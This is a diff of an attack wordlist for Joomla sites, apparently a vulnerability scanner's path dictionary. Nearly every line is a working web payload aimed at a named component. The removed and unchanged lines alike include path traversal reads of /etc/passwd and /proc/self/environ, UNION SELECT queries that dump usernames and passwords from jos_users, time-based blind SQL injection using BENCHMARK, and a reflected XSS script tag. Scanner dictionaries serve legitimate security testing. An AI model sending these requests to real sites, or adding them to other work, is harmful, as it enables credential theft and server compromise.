@@ -1,4 +1,3 @@
-&controller=../../../../../../../../../../../../etc/passwd%00
 ?1.5.10-x
 ?1.5.11-x-http_ref
 ?1.5.11-x-php-s3lf
@@ -104,7 +103,6 @@ includes/joomla.php
 index.php/404'
 index.php/?option=com_question&catID=21'+and+1=0+union+all
 index.php/image-gallery/"><script>alert('xss')</script>/25-koala
-index.php?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&jat3action=gzip&amp;type=css&v=1
 index.php?option=com_aardvertiser&cat_name=conf&task=<=
 index.php?option=com_aardvertiser&cat_name=Vehicles'+AND+'1'='1&task=view
 index.php?option=com_aardvertiser&task=
@@ -118,10 +116,6 @@ index.php?option=com_articleman&task=new
 index.php?option=com_bbs&bid=-1
 index.php?option=com_beamospetition&startpage=3&pet=-
 index.php?option=com_beamospetition&startpage=3&pet=-1+Union+select+user()+from+jos_users-
-index.php?option=com_bearleague&task=team&tid=8&sid=1&Itemid=%27
-index.php?option=com_beeheard&controller=../../../../../../../../../../etc/passwd%00
-index.php?option=com_biblioteca&view=biblioteca&testo=-a%25'+UNION+SELECT+1,username,password,4,5,6,7,8,9+FROM+jos_users%23
-index.php?option=com_blogfactory&controller=../../../../../../../../../../etc/passwd%00
 index.php?option=com_bnf&task=listar&action=filter_add&seccion=pago&seccion_id=-1
 index.php?option=com_camelcitydb2&id=-3+union+select+1,2,concat(username,0x3a,password),4,5,6,7,8,9,10,11+from+jos_users--
 index.php?option=com_chronoconnectivity&itemid=1
@@ -133,8 +127,6 @@ index.php?option=com_commedia&format=raw&task=image&pid=4&id=964'
 index.php?option=com_commedia&task=page&commpid=21
 index.php?option=com_connect&view=connect&controller=
 index.php?option=com_content&view=article&id=[A+VALID+ID]&Itemid=[A+VALID+ID]&sflaction=dir&sflDir=../../../
-index.php?option=com_delicious&controller=../../../../../../../../../../etc/passwd%00
-index.php?option=com_dioneformwizard&controller=[LFI]%00
 index.php?option=com_discussions&view=thread&catid=[Correct+CatID]&thread=-1
 index.php?option=com_dshop&controller=fpage&task=flypage&idofitem=12
 index.php?option=com_easyfaq&catid=1&task=view&id=-2527+
@@ -150,11 +142,8 @@ index.php?option=com_ezautos&Itemid=49&id=1&task=helpers&firstCode=1
 index.php?option=com_fabrik&view=table&tableid=13+union+select+1----
 index.php?option=com_filecabinet&task=download&cid[]=7
 index.php?option=com_firmy&task=section_show_set&Id=-1
-index.php?option=com_fss&view=test&prodid=777777.7'+union+all+select+77777777777777%2C77777777777777%2C77777777777777%2Cversion()%2C77777777777777%2C77777777777777%2C77777777777777%2C77777777777777%2C77777777777777%2C77777777777777%2C77777777777777--+D4NB4R
 index.php?option=com_golfcourseguide&view=golfcourses&cid=1&id=
 index.php?option=com_graphics&controller=
-index.php?option=com_grid&gid=15_ok_0',%20'15_ok_0&data_search=
-index.php?option=com_grid&gid=15_ok_0',%20'15_ok_0?data_search=&rpp=
 index.php?option=com_huruhelpdesk&view=detail
 index.php?option=com_huruhelpdesk&view=detail&cid[0]=
 index.php?option=com_huruhelpdesk&view=detail&cid[0]=-1
@@ -163,17 +152,13 @@ index.php?option=com_icagenda&view=list&layout=event&Itemid=520&id=1+and+1=2
 index.php?option=com_icagenda&view=list&layout=event&Itemid=520&id[]=1
 index.php?option=com_iproperty&view=agentproperties&id=
 index.php?option=com_jacomment&view=
-index.php?option=com_jacomment&view=../../../../../../../../../../etc/passwd%00
-index.php?option=com_javoice&view=../../../../../../../../../../../../../../../etc/passwd%00
 index.php?option=com_jcommunity&controller=members&task=1'
 index.php?option=com_jeajaxeventcalendar&view=alleventlist_more&event_id=-13
 index.php?option=com_jefaqpro&view=category&layout=categorylist&catid=2
 index.php?option=com_jefaqpro&view=category&layout=categorylist&task=lists&catid=2
-index.php?option=com_jeguestbook&view=../../../../../../../../etc/passwd%00
 index.php?option=com_jeguestbook&view=item_detail&d_itemid=-1+OR+(SELECT(IF(0x41=0x41,+BENCHMARK(999999999,NULL),NULL)))
 index.php?option=com_jfuploader&Itemid=
 index.php?option=com_jgen&task=view&id=
-index.php?option=com_jgrid&controller=../../../../../../../../etc/passwd%00
 index.php?option=com_jimtawl&Itemid=12&task=
 index.php?option=com_jmarket&controller=product&task=1'
 index.php?option=com_jobprofile&Itemid=61&task=profilesview&id=1'
@@ -183,8 +168,6 @@ index.php?option=com_joomla_flash_uploader&Itemid=1
 index.php?option=com_joomleague&func=showNextMatch&p=[sqli]
 index.php?option=com_joomleague&view=resultsmatrix&p=4&Itemid=[sqli]
 index.php?option=com_joomtouch&controller=
-index.php?option=com_jphone&controller../../../../../../../../../../etc/passwd%00
-index.php?option=com_jphone&controller../../../../../../../../../../proc/self/environ%00
 index.php?option=com_jscalendar&view=jscalendar&task=details&ev_id=999+UNION+SELECT+1,username,password,4,5,6,7,8+FROM+jos_users
 index.php?option=com_jstore&controller=product-display&task=1'
 index.php?option=com_jsubscription&controller=subscription&task=1'
@@ -193,12 +176,10 @@ index.php?option=com_konsultasi&act=detail&sid=
 index.php?option=com_ksadvertiser&Itemid=36&task=add&catid=0&lang=en
 index.php?option=com_kunena&func=userlist&search=
 index.php?option=com_lead&task=display&archive=1&Itemid=65&leadstatus=1'
-index.php?option=com_lovefactory&controller=../../../../../../../../../../etc/passwd%00
 index.php?option=com_markt&page=show_category&catid=7+union+select+0,1,password,3,4,5,username,7,8+from+jos_users--
 index.php?option=com_matamko&controller=
 index.php?option=com_myhome&task=4&nidimmindex.php?option=com_myhome&task=4&nidimm
 index.php?option=com_neorecruit&task=offer_view&id=
-index.php?option=com_newsfeeds&view=categories&feedid=-1%20union%20select%201,concat%28username,char%2858%29,password%29,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30%20from%20jos_users--
 index.php?option=com_noticeboard&controller=
 index.php?option=com_obsuggest&controller=
 index.php?option=com_ongallery&task=ft&id=-1+order+by+1--
@@ -206,7 +187,6 @@ index.php?option=com_ongallery&task=ft&id=-1+union+select+1--
 index.php?option=com_oziogallery&Itemid=
 index.php?option=com_page&id=53
 index.php?option=com_pbbooking&task=validate&id=-1+OR+(SELECT(IF(0x41=0x41,BENCHMARK(999999999,NULL),NULL)))
-index.php?option=com_pcchess&controller=../../../../../../../../../../../../../etc/passwd%00
 index.php?option=com_peliculas&view=peliculas&id=null[Sql+Injection]
 index.php?option=com_phocagallery&view=categories&Itemid=
 index.php?option=com_photomapgallery&view=imagehandler&folder=-1+OR+(SELECT(IF(0x41=0x41,BENCHMARK(9999999999,NULL),NULL)))
@@ -221,7 +201,6 @@ index.php?option=com_products&task=category&catid=-1
 index.php?option=com_properties&task=agentlisting&aid=
 index.php?option=com_qcontacts&Itemid=1'
 index.php?option=com_qcontacts?=catid=0&filter_order=[SQLi]&filter_order_Dir=&option=com_qcontacts
-index.php?option=com_record&controller=../../../../../../../../../../etc/passwd%00
 index.php?option=com_restaurantguide&view=country&id='&Itemid=69
 index.php?option=com_rokmodule&tmpl=component&type=raw&module=1'
 index.php?option=com_seyret&view=
@@ -241,11 +220,8 @@ index.php?option=com_timetrack&view=timetrack&ct_id=-1+UNION+SELECT+1,2,3,4,5,6,
 index.php?option=com_ultimateportfolio&controller=
 index.php?option=com_users&view=registration
 index.php?option=com_virtuemart&page=account.index&keyword=[sqli]
-index.php?option=com_worldrates&controller=../../../../../../../../../../etc/passwd%00
 index.php?option=com_x-shop&action=artdetail&idd='
 index.php?option=com_x-shop&action=artdetail&idd='[SQLi]
-index.php?option=com_xcomp&controller=../../[LFI]%00
-index.php?option=com_xvs&controller=../../[LFI]%00
 index.php?option=com_yellowpages&cat=-1923+UNION+SELECT+1,concat_ws(0x3a,username,password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37+from+jos_users--+Union+select+user()+from+jos_users--
 index.php?option=com_yjcontactus&view=
 index.php?option=com_youtube&id_cate=4
@@ -271,4 +247,3 @@ templates/be2004-2/
 templates/ja_purity/
 wap/wapmain.php?option=onews&action=link&id=-154+union+select+1,2,3,concat(username,0x3a,password),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28+from+jos_users+limit+0,1--
 web/index.php?option=com_rokmodule&tmpl=component&type=raw&module=1'
-web/index.php?option=com_rokmodule&tmpl=component&type=raw&module=1'&controller=../../../../../../../../../../../../[LFI]%00
